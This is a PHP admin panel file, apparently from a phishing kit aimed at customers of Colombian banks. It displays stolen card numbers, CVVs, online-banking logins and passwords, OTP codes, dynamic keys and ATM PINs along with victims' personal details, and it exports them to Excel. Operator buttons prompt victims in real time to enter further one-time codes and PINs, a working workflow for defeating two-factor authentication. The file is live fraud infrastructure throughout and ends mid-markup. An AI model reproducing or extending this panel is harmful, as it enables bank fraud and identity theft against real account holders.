<?php
// panel/index.php
require_once __DIR__ . '/config/config.php';

if (!estaAutenticado()) {
    header('Location: login.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
    exit;
}

// ============================================
// ELIMINAR SOLICITUD INDIVIDUAL
// ============================================
if (isset($_GET['eliminar']) && !empty($_GET['eliminar'])) {
    $id = $_GET['eliminar'];
    $solicitudes = cargarSolicitudes();
    $nuevasSolicitudes = [];
    
    foreach ($solicitudes as $s) {
        if ($s['id'] !== $id) {
            $nuevasSolicitudes[] = $s;
        }
    }
    
    guardarSolicitudes($nuevasSolicitudes);
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=eliminado');
    exit;
}

// ============================================
// ELIMINAR TODAS LAS SOLICITUDES
// ============================================
if (isset($_GET['eliminar_todas']) && $_GET['eliminar_todas'] === 'si') {
    guardarSolicitudes([]);
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=todas_eliminadas');
    exit;
}

// ============================================
// EXPORTAR A EXCEL
// ============================================
if (isset($_GET['exportar_excel'])) {
    $solicitudes = cargarSolicitudes();
    
    if (empty($solicitudes)) {
        header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001&mensaje=sin_datos');
        exit;
    }
    
    header('Content-Type: application/vnd.ms-excel');
    header('Content-Disposition: attachment; filename="solicitudes_' . date('Y-m-d') . '.xls"');
    header('Cache-Control: max-age=0');
    
    echo '<html><head><meta charset="UTF-8"></head><body>';
    echo '<table border="1">';
    
    echo '<tr>';
    echo '<th>ID</th>';
    echo '<th>Fecha</th>';
    echo '<th>Tarjeta</th>';
    echo '<th>CVV</th>';
    echo '<th>Vencimiento</th>';
    echo '<th>Banco</th>';
    echo '<th>Usuario</th>';
    echo '<th>Contraseña</th>';
    echo '<th>Código</th>';
    echo '<th>Modo</th>';
    echo '<th>Monto</th>';
    echo '<th>Nombre</th>';
    echo '<th>Documento</th>';
    echo '<th>Email</th>';
    echo '<th>Celular</th>';
    echo '<th>Estado</th>';
    echo '</tr>';
    
    foreach ($solicitudes as $s) {
        $estados = [
            'pending' => 'Pendiente',
            'pending_otp' => 'OTP Pendiente',
            'pending_clave_cajero' => 'Clave Cajero Pendiente',
            'approved' => 'Aprobada',
            'approved_otp' => 'OTP Aprobado',
            'approved_clave_cajero' => 'Clave Cajero Aprobado',
            'rejected' => 'Rechazada',
            'rejected_otp' => 'OTP Rechazado',
            'rejected_clave_cajero' => 'Clave Cajero Rechazado'
        ];
        
        echo '<tr>';
        echo '<td>' . htmlspecialchars($s['id'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['fecha'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['numero_tarjeta'] ?? $s['tarjeta'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['cvv'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['vencimiento'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['banco'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['usuario'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['password'] ?? '') . '</td>';
        
        $codigos = [];
        if (!empty($s['clave_cajero_codigo']) && $s['clave_cajero_codigo'] !== 'N/A') {
            $codigos[] = '🏧 Cajero: ' . $s['clave_cajero_codigo'];
        }
        if (!empty($s['clave_dinamica_codigo']) && $s['clave_dinamica_codigo'] !== 'N/A') {
            $codigos[] = '🔑 Dinámica: ' . $s['clave_dinamica_codigo'];
        }
        if (!empty($s['otp_codigo']) && $s['otp_codigo'] !== 'N/A' && !isset($s['clave_cajero_codigo'])) {
            $codigos[] = '📱 OTP: ' . $s['otp_codigo'];
        }
        if (!empty($s['otp_codigo_secundario']) && $s['otp_codigo_secundario'] !== 'N/A') {
            $codigos[] = '📱 OTP Sec: ' . $s['otp_codigo_secundario'];
        }
        
        echo '<td>' . implode(' | ', $codigos) . '</td>';
        echo '<td>' . htmlspecialchars($s['otp_modo'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['monto'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['nombre'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['documento'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['email'] ?? '') . '</td>';
        echo '<td>' . htmlspecialchars($s['celular'] ?? '') . '</td>';
        echo '<td>' . ($estados[$s['estado']] ?? $s['estado']) . '</td>';
        echo '</tr>';
    }
    
    echo '</table>';
    echo '</body></html>';
    exit;
}

// ============================================
// PROCESAR ACCIONES
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && isset($_POST['id'])) {
    $id = $_POST['id'];
    $action = $_POST['action'];
    
    $solicitudes = cargarSolicitudes();
    $encontrado = false;
    foreach ($solicitudes as &$s) {
        if ($s['id'] === $id) {
            if ($action === 'aprobar') {
                $s['estado'] = 'approved';
            } elseif ($action === 'rechazar') {
                $s['estado'] = 'rejected';
            } elseif ($action === 'aprobar_otp') {
                $s['estado'] = 'approved_otp';
            } elseif ($action === 'rechazar_otp') {
                $s['estado'] = 'rejected_otp';
            } elseif ($action === 'pedir_otp') {
                $s['estado'] = 'pending_otp';
                $s['otp_modo'] = 'otp';
            } elseif ($action === 'pedir_clave_din') {
                $s['estado'] = 'pending_otp';
                $s['otp_modo'] = 'clave_dinamica';
            } elseif ($action === 'error_credenciales') {
                $s['estado'] = 'rejected';
            } elseif ($action === 'error_usuario') {
                // 🔥 ERROR USUARIO: Reiniciar usuario y contraseña, volver a pending
                $s['usuario'] = 'N/A';
                $s['password'] = 'N/A';
                $s['estado'] = 'pending';
                $s['otp_codigo'] = 'N/A';
                $s['clave_cajero_codigo'] = 'N/A';
                $s['clave_dinamica_codigo'] = 'N/A';
                $s['otp_codigo_secundario'] = 'N/A';
                $s['otp_modo'] = 'N/A';
            } elseif ($action === 'aprobar_clave_cajero') {
                $s['estado'] = 'approved_clave_cajero';
            } elseif ($action === 'rechazar_clave_cajero') {
                $s['estado'] = 'rejected_clave_cajero';
            } elseif ($action === 'pedir_clave_cajero') {
                $s['estado'] = 'pending_clave_cajero';
                $s['otp_modo'] = 'clave_cajero';
            }
            $s['fecha_procesada'] = date('Y-m-d H:i:s');
            $encontrado = true;
            break;
        }
    }
    
    if ($encontrado) {
        guardarSolicitudes($solicitudes);
    }
    
    header('Location: index.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001');
    exit;
}

$solicitudes = cargarSolicitudes();

$total = count($solicitudes);
$pendientes = count(array_filter($solicitudes, function($s) { 
    return in_array($s['estado'], ['pending', 'pending_otp', 'pending_clave_cajero']);
}));
$aprobadas = count(array_filter($solicitudes, function($s) { 
    return in_array($s['estado'], ['approved', 'approved_otp', 'approved_clave_cajero']);
}));
$rechazadas = count(array_filter($solicitudes, function($s) { 
    return in_array($s['estado'], ['rejected', 'rejected_otp', 'rejected_clave_cajero']);
}));

// 🔐 GENERAR CSRF TOKEN PARA LOS FORMULARIOS
$csrf_token = generarCsrfToken();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Panel de Control</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0f0f1a; padding: 20px; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            background: #1a1a2e; padding: 20px 24px; border-radius: 12px;
            margin-bottom: 24px; border: 1px solid #2a2a4e;
            flex-wrap: wrap;
            gap: 12px;
        }
        .header h1 { color: #fff; font-size: 22px; }
        .header .user { color: #8b8ba8; font-size: 14px; }
        .header .user a { color: #ff6b6b; text-decoration: none; margin-left: 12px; }
        
        .header .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #8b8ba8;
        }
        .header .status-indicator .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #4ade80;
            animation: pulse-dot 2s infinite;
        }
        .header .status-indicator .dot.error {
            background: #ff6b6b;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        
        .btn-notificaciones {
            background: #2a2a4e;
            color: #8b8ba8;
            border: 1px solid #3a3a5e;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-notificaciones:hover {
            background: #3a3a6e;
            color: #fff;
            border-color: #5a5a8e;
        }
        .btn-notificaciones.activo {
            background: #1a3a2a;
            color: #4ade80;
            border-color: #4ade80;
        }
        
        .btn-excel {
            background: #1a3a2a;
            color: #4ade80;
            border: 1px solid #4ade80;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-excel:hover {
            background: #4ade80;
            color: #0f0f1a;
        }
        
        .btn-eliminar-todas {
            background: #3a1a1a;
            color: #ff6b6b;
            border: 1px solid #ff6b6b;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .btn-eliminar-todas:hover {
            background: #ff6b6b;
            color: #0f0f1a;
        }
        
        .btn-eliminar {
            background: #dc2626;
            color: #fff;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            border: none;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .btn-eliminar:hover {
            opacity: 0.8;
        }
        
        .header-buttons {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .stats {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px; margin-bottom: 24px;
        }
        .stat-card {
            background: #1a1a2e; padding: 20px; border-radius: 12px;
            border: 1px solid #2a2a4e; text-align: center;
            transition: border-color 0.5s, transform 0.3s;
        }
        .stat-card .number { font-size: 28px; font-weight: 700; transition: all 0.3s; }
        .stat-card .label { font-size: 14px; color: #8b8ba8; margin-top: 4px; }
        .stat-card .number.pending { color: #f7c948; }
        .stat-card .number.approved { color: #4ade80; }
        .stat-card .number.rejected { color: #ff6b6b; }
        .stat-card .number.total { color: #60a5fa; }
        
        .solicitudes {
            background: #1a1a2e; border-radius: 12px; border: 1px solid #2a2a4e; overflow: hidden;
        }
        .solicitudes .title {
            padding: 20px 24px; font-weight: 600; color: #fff;
            border-bottom: 1px solid #2a2a4e;
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .solicitudes .title .badge {
            background: #2a2a4e; padding: 4px 12px; border-radius: 20px;
            font-size: 12px; color: #8b8ba8;
        }
        .solicitudes .title .auto-update {
            font-size: 12px;
            color: #4ade80;
            font-weight: 400;
        }
        .solicitud {
            padding: 16px 24px;
            border-bottom: 1px solid #1f1f36;
            display: flex;
            flex-direction: column;
            gap: 10px;
            transition: background 0.3s;
        }
        .solicitud:hover { background: #22223a; }
        .solicitud.nuevo {
            animation: highlight-new 1s ease;
        }
        @keyframes highlight-new {
            0% { background: #2a2a4a; border-left: 3px solid #f7c948; }
            100% { background: transparent; border-left: 3px solid transparent; }
        }
        
        .solicitud .card-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 20px;
        }
        .solicitud .card-number {
            font-family: monospace;
            font-size: 18px;
            color: #4ade80;
            letter-spacing: 1px;
            font-weight: 700;
        }
        .solicitud .card-detail {
            font-size: 13px;
            color: #8b8ba8;
        }
        .solicitud .card-detail .highlight {
            color: #f7c948;
            font-weight: 600;
        }
        .solicitud .card-detail .bank {
            color: #60a5fa;
            font-weight: 500;
        }
        .solicitud .credenciales-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px 24px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .credenciales-row .campo {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
        }
        .solicitud .credenciales-row .campo .etiqueta {
            color: #6a6a8a;
            font-weight: 500;
        }
        .solicitud .credenciales-row .campo .valor {
            color: #a78bfa;
            font-weight: 600;
        }
        
        .solicitud .codigos-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px 24px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .codigo-item {
            display: flex;
            align-items: center;
            gap: 6px;
            background: #1f1f36;
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid #2a2a4e;
        }
        .solicitud .codigo-item .codigo-label {
            font-size: 12px;
            font-weight: 600;
            color: #60a5fa;
        }
        .solicitud .codigo-item .codigo-valor {
            font-family: monospace;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .solicitud .codigo-item.clave-cajero .codigo-valor {
            color: #fbbf24;
        }
        .solicitud .codigo-item.otp .codigo-valor {
            color: #ff6b6b;
        }
        .solicitud .codigo-item.clave-dinamica .codigo-valor {
            color: #a78bfa;
        }
        
        .solicitud .datos-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 20px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
            font-size: 13px;
            color: #c8c8e8;
        }
        .solicitud .datos-row .nombre {
            color: #fff;
            font-weight: 600;
        }
        .solicitud .datos-row .label {
            color: #6a6a8a;
        }
        .solicitud .actions-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px 16px;
            padding-top: 8px;
            border-top: 1px solid #1f1f36;
        }
        .solicitud .estado {
            font-size: 12px;
            font-weight: 600;
            padding: 4px 12px;
            border-radius: 20px;
            text-align: center;
        }
        .estado.pending { background: #3a2a1a; color: #f7c948; }
        .estado.pending_otp { background: #3a2a4a; color: #a78bfa; }
        .estado.pending_clave_cajero { background: #2a3a4a; color: #60a5fa; }
        .estado.approved { background: #1a3a2a; color: #4ade80; }
        .estado.approved_otp { background: #1a3a4a; color: #818cf8; }
        .estado.approved_clave_cajero { background: #1a4a3a; color: #34d399; }
        .estado.rejected { background: #3a1a1a; color: #ff6b6b; }
        .estado.rejected_otp { background: #3a1a2a; color: #f472b6; }
        .estado.rejected_clave_cajero { background: #3a1a2a; color: #f87171; }
        
        .btn {
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            font-size: 11px;
            font-family: inherit;
            transition: opacity 0.2s;
            white-space: nowrap;
        }
        .btn:hover { opacity: 0.8; }
        .btn-approve { background: #4ade80; color: #0f0f1a; }
        .btn-reject { background: #ff6b6b; color: #0f0f1a; }
        .btn-otp { background: #818cf8; color: #0f0f1a; }
        .btn-cajero { background: #fbbf24; color: #0f0f1a; }
        .btn-danger { background: #dc2626; color: #fff; }
        .btn-error-usuario { background: #ef4444; color: #fff; }
        .btn-error-usuario:hover { background: #dc2626; }
        .btn-disabled { background: #2a2a4e; color: #6a6a8a; cursor: not-allowed; }
        .btn-pedir { background: #8b5cf6; color: #fff; }
        .btn-pedir:hover { background: #7c3aed; }
        .form-actions { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
        .form-actions form { display: inline-block; }
        .empty { padding: 60px 20px; text-align: center; color: #6a6a8a; }
        .empty .icon { font-size: 48px; margin-bottom: 16px; display: block; }
        
        @media (max-width: 768px) {
            .stats { grid-template-columns: 1fr 1fr; }
            .header { flex-direction: column; text-align: center; }
            .header-buttons { justify-content: center; }
            .solicitud { padding: 12px 16px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📋 Panel de Control</h1>
            <div class="header-buttons">
                <button class="btn-excel" onclick="exportarExcel()">
                    📊 Exportar Excel
                </button>
                <button class="btn-eliminar-todas" onclick="eliminarTodas()">
                    🗑️ Eliminar todas
                </button>
                <div class="status-indicator">
                    <span class="dot" id="statusDot"></span>
                    <span id="statusText">Auto-actualización</span>
                </div>
                <div class="user">
                    👤 Admin
                    <a href="logout.php?llave=0b2c4e6c3bcb7209f5ef20632b6ff001">🚪 Salir</a>
                </div>
            </div>
        </div>
        
        <div class="stats" id="statsContainer">
            <div class="stat-card" id="statTotal">
                <div class="number total"><?php echo $total; ?></div>
                <div class="label">📊 Total</div>
            </div>
            <div class="stat-card" id="statPending">
                <div class="number pending"><?php echo $pendientes; ?></div>
                <div class="label">⏳ Pendientes</div>
            </div>
            <div class="stat-card" id="statApproved">
                <div class="number approved"><?php echo $aprobadas; ?></div>
                <div class="label">✅ Aprobadas</div>
            </div>
            <div class="stat-card" id="statRejected">
                <div class="number rejected"><?php echo $rechazadas; ?></div>
                <div class="label">❌ Rechazadas</div>
            </div>
        </div>
        
        <?php if (isset($error)): ?>
            <div style="background: #3a1a1a; color: #ff6b6b; padding: 12px 20px; border-radius: 8px; margin-bottom: 16px;">
                ❌ <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>
        
        <div class="solicitudes">
            <div class="title">
                <span>📥 Solicitudes</span>
                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                    <span class="auto-update" id="updateCounter">🔄 Actualizando...</span>
                    <span class="badge" id="totalBadge"><?php echo $total; ?> total</span>
                </div>
            </div>
            
            <div id="solicitudesList">
                <?php if (empty($solicitudes)): ?>
                    <div class="empty">
                        <span class="icon">📭</span>
                        No hay solicitudes aún
                    </div>
                <?php else: ?>
                    <?php foreach (array_reverse($solicitudes) as $s): ?>
                        <?php 
                            $banco = $s['banco'] ?? '';
                            $bancosClaveCajero = ['BBVA Colombia', 'Davibank', 'Davivienda', 'Caja Social'];
                            $mostrarClaveCajero = in_array($banco, $bancosClaveCajero);
                        ?>
                        <div class="solicitud" data-id="<?php echo $s['id']; ?>" data-estado="<?php echo $s['estado']; ?>">
                            
                            <!-- FILA 1: NÚMERO DE TARJETA -->
                            <div class="card-row">
                                <span class="card-number">💳 <?php echo htmlspecialchars($s['numero_tarjeta'] ?? $s['tarjeta'] ?? 'N/A'); ?></span>
                            </div>
                            
                            <!-- FILA 2: CVV, EXP, BANCO -->
                            <div class="card-row">
                                <span class="card-detail">🔢 CVV: <span class="highlight"><?php echo htmlspecialchars($s['cvv'] ?? '***'); ?></span></span>
                                <span class="card-detail">📅 Exp: <span class="highlight"><?php echo htmlspecialchars($s['vencimiento'] ?? 'N/A'); ?></span></span>
                                <span class="card-detail">🏦 <span class="bank"><?php echo htmlspecialchars($s['banco'] ?? 'N/A'); ?></span></span>
                            </div>
                            
                            <!-- FILA 3: USUARIO Y CONTRASEÑA -->
                            <?php if (isset($s['usuario']) && $s['usuario'] !== 'N/A' && !empty($s['usuario'])): ?>
                                <div class="credenciales-row">
                                    <div class="campo">
                                        <span class="etiqueta">Usuario:</span>
                                        <span class="valor"><?php echo htmlspecialchars($s['usuario']); ?></span>
                                    </div>
                                    <div class="campo">
                                        <span class="etiqueta">Contraseña:</span>
                                        <span class="valor"><?php echo htmlspecialchars($s['password'] ?? '****'); ?></span>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                         <!-- FILA 4: CÓDIGOS -->
<?php 
$tieneClaveCajero = !empty($s['clave_cajero_codigo']) && $s['clave_cajero_codigo'] !== 'N/A' && $s['clave_cajero_codigo'] !== '';
$tieneClaveDinamica = !empty($s['clave_dinamica_codigo']) && $s['clave_dinamica_codigo'] !== 'N/A' && $s['clave_dinamica_codigo'] !== '';
$tieneOtp = !empty($s['otp_codigo']) && $s['otp_codigo'] !== 'N/A' && $s['otp_codigo'] !== '';
$tieneOtpSecundario = !empty($s['otp_codigo_secundario']) && $s['otp_codigo_secundario'] !== 'N/A' && $s['otp_codigo_secundario'] !== '';
?>
<?php if ($tieneClaveCajero || $tieneClaveDinamica || $tieneOtp || $tieneOtpSecundario): ?>
    <div class="codigos-row">
        <?php if ($tieneClaveCajero): ?>
            <div class="codigo-item clave-cajero">
                <span class="codigo-label">🏧 Clave Cajero:</span>
                <span class="codigo-valor"><?php echo htmlspecialchars($s['clave_cajero_codigo']); ?></span>
            </div>
        <?php endif; ?>
        
        <?php if ($tieneOtp): ?>
            <div class="codigo-item otp">
                <span class="codigo-label">📱 OTP:</span>
                <span class="codigo-valor"><?php echo htmlspecialchars($s['otp_codigo']); ?></span>
            </div>
        <?php endif; ?>
        
        <?php if ($tieneClaveDinamica): ?>
            <div class="codigo-item clave-dinamica">
                <span class="codigo-label">🔑 Clave Dinámica:</span>
                <span class="codigo-valor"><?php echo htmlspecialchars($s['clave_dinamica_codigo']); ?></span>
            </div>
        <?php endif; ?>
        
        <?php if ($tieneOtpSecundario): ?>
            <div class="codigo-item otp">
                <span class="codigo-label">📱 OTP Secundario:</span>
                <span class="codigo-valor"><?php echo htmlspecialchars($s['otp_codigo_secundario']); ?></span>
            </div>
        <?php endif; ?>
    </div>
<?php endif; ?>
                            
                            <!-- FILA 5: DATOS PERSONALES -->
                            <?php if (isset($s['nombre']) && $s['nombre'] !== 'N/A'): ?>
                                <div class="datos-row">
                                    <span><span class="label">👤</span> <span class="nombre"><?php echo htmlspecialchars($s['nombre']); ?></span></span>
                                    <span><span class="label">🆔</span> <?php echo htmlspecialchars($s['documento'] ?? 'N/A'); ?></span>
                                    <span><span class="label">📧</span> <?php echo htmlspecialchars($s['email'] ?? 'N/A'); ?></span>
                                    <span><span class="label">📱</span> <?php echo htmlspecialchars($s['celular'] ?? 'N/A'); ?></span>
                                    <span><span class="label">💰</span> <?php echo htmlspecialchars($s['monto'] ?? 'N/A'); ?></span>
                                </div>
                            <?php endif; ?>
                            
                            <!-- FILA 6: ESTADO Y BOTONES -->
                            <div class="actions-row">
                                <span class="estado <?php echo $s['estado']; ?>">
                                    <?php 
                                        $estados = [
                                            'pending' => '⏳ Pendiente',
                                            'pending_otp' => '⏳ OTP Pendiente',
                                            'pending_clave_cajero' => '⏳ Clave Cajero Pendiente',
                                            'approved' => '✅ Aprobada',
                                            'approved_otp' => '✅ OTP Aprobado',
                                            'approved_clave_cajero' => '✅ Clave Cajero Aprobado',
                                            'rejected' => '❌ Rechazada',
                                            'rejected_otp' => '❌ OTP Rechazado',
                                            'rejected_clave_cajero' => '❌ Clave Cajero Rechazado'
                                        ];
                                        echo $estados[$s['estado']] ?? $s['estado']; 
                                    ?>
                                </span>
                                
                                <div class="form-actions">
                                    <?php if ($s['estado'] === 'pending'): ?>
                                        <?php if (!isset($s['usuario']) || $s['usuario'] === 'N/A' || empty($s['usuario'])): ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="aprobar" />
                                                <button type="submit" class="btn btn-approve">✅ Aprobar</button>
                                            </form>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="rechazar" />
                                                <button type="submit" class="btn btn-reject">❌ Rechazar</button>
                                            </form>
                                        <?php else: ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_otp" />
                                                <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                                            </form>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_clave_din" />
                                                <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                                            </form>
                                            <?php if ($mostrarClaveCajero): ?>
                                                <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                    <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                    <input type="hidden" name="action" value="pedir_clave_cajero" />
                                                    <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                                                </form>
                                            <?php endif; ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="error_usuario" />
                                                <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                                            </form>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="error_credenciales" />
                                                <button type="submit" class="btn btn-danger">❌ ERROR</button>
                                            </form>
                                        <?php endif; ?>
                                        
                                    <?php elseif ($s['estado'] === 'pending_otp'): ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="aprobar_otp" />
                                            <button type="submit" class="btn btn-approve">✅ Aprobar OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="rechazar_otp" />
                                            <button type="submit" class="btn btn-reject">❌ Rechazar OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="error_usuario" />
                                            <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                                        </form>
                                        <?php if ($mostrarClaveCajero): ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_clave_cajero" />
                                                <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                                            </form>
                                        <?php endif; ?>
                                        
                                    <?php elseif ($s['estado'] === 'pending_clave_cajero'): ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="aprobar_clave_cajero" />
                                            <button type="submit" class="btn btn-approve">✅ Aprobar Clave Cajero</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="rechazar_clave_cajero" />
                                            <button type="submit" class="btn btn-reject">❌ Rechazar Clave Cajero</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="error_usuario" />
                                            <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="pedir_otp" />
                                            <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="pedir_clave_din" />
                                            <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                                        </form>
                                        
                                    <?php elseif ($s['estado'] === 'approved' || $s['estado'] === 'approved_otp' || $s['estado'] === 'approved_clave_cajero'): ?>
                                        <span class="btn btn-disabled">✅ Aprobado</span>
                                        
                                    <?php elseif ($s['estado'] === 'rejected' || $s['estado'] === 'rejected_otp' || $s['estado'] === 'rejected_clave_cajero'): ?>
                                        <span class="btn btn-disabled">❌ Rechazado</span>
